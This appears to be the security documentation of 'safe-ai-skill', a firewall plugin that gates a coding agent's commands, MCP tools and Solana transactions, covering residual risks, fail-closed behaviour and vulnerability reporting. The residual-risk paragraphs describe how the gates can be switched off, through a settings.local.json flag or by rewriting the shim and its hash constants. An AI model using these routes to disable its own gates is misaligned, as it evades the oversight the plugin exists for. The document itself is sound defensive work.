**Residual risk: `SAFE_AI_SKILL_DISABLE` in `.claude/settings.local.json` is honoured.** The shim ignores `SAFE_AI_SKILL_DISABLE=1` only when the committed `.claude/settings.json` mentions it (any `SAFE_AI_SKILL` text or `\u` escape). `.claude/settings.local.json` is the user's own, gitignored file, so a value there switches the firewall off, and SessionStart reports it. A repo that commits a `settings.local.json` anyway, or a tool that writes one into the project, turns the firewall off the same way. Check that `settings.local.json` is ignored by git, and treat a committed one as hostile.

**Residual risk: the shim is the trust anchor.** The shim checks the engine binary against sha256 constants stamped at release and never runs a mismatch. Anything that can write the plugin's `bin/` directory can rewrite the shim and its constants just as easily, and could swap the binary between the hash and the exec. Both are out of reach of the agent through the write tripwire on `~/.claude/plugins`; neither is defended against a local process running as the user.

**Fail-closed policy.** If the plugin's `default.policy.yaml` cannot be parsed, `policy.rs` falls back to treating all gated actions as `ask`. A project's `.safe-ai-skill/policy.yaml` can only tighten the policy: a setting that would loosen it is ignored and listed at SessionStart, invalid YAML is ignored, and ill-typed values fail closed. The session is not left without gates because of a config file error. The shared lists (`policy/shared/*`) are embedded in the binary at build; if one fails to parse at runtime, the gates that depend on it fall back to a hard-guard `ask`, never to no opinion.

**External API timeouts do not allow.** osv.dev is an external network call. On timeout or API unavailability, the decision is `ask` (not `allow`, not `deny`). The user is informed and must approve. The rugcheck swap check is not wired in 1.0.1 (see below): MCP swaps always `ask`.

**`deny` survives `bypassPermissions`.** Verified against Claude Code official docs (2026-06). Sessions running with `bypassPermissions` cannot override hook `deny` decisions.

**`deny` survives `enableAllProjectMcpServers`.** Verified against Claude Code hook execution order. MCP pre-approval in project settings does not bypass `gate-mcp` PreToolUse decisions.

## Out of scope for v1

### Lighthouse assertions

Lighthouse is a Solana program (`L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95`, deployed mainnet and devnet) that allows embedding verifiable assertions as instructions in a transaction. The assertion is checked on-chain at execution time, not in simulation.

Retrofitting Lighthouse assertions onto a transaction already built by `solana-cli` or `anchor deploy` requires re-signing the transaction. safe-ai-skill gates commands at the CLI/MCP layer, after the transaction has been constructed and before it is submitted. Inserting Lighthouse assertions at this stage without owning the tx-construction path is not possible.

This is deferred to a future "guarded signer" component: an MCP tool that exposes `signAndSend`, holds session-key access, and can simulate, append Lighthouse assertions, and sign in a single controlled step before submission.

### Turnkey

Turnkey is a SaaS wallet-as-a-service product evaluated and skipped for v1. The free tier is 25 total signatures (not per day); beyond that, $0.10 per signature. Phase 3 session keypairs achieve the same spend-cap-by-construction guarantee with zero external dependencies.

### Dual-install detection in `safe-ai-skill doctor`

`safe-ai-skill doctor` checks your Claude Code sandbox settings and prints the `denyRead` entries to add. What it does not do yet is detect a plugin installed together with a full solana-ai-kit config-repo install (both `SessionStart` hooks fire): reporting which gates are active or superseded, and diagnosing `settings.json` overlap, is deferred to a future release.

## Vulnerability reporting

To report a security vulnerability in safe-ai-skill, send email to **security@superteam.com.br** with subject line `[safe-ai-skill] vulnerability report`.

Include in your report:

- A description of the vulnerability and the affected component
- Reproduction steps (include relevant hook payloads, commands, or policy configurations)
- An assessment of the impact and any attack conditions

We will acknowledge receipt within 48 hours. Please allow reasonable time for assessment before public disclosure.
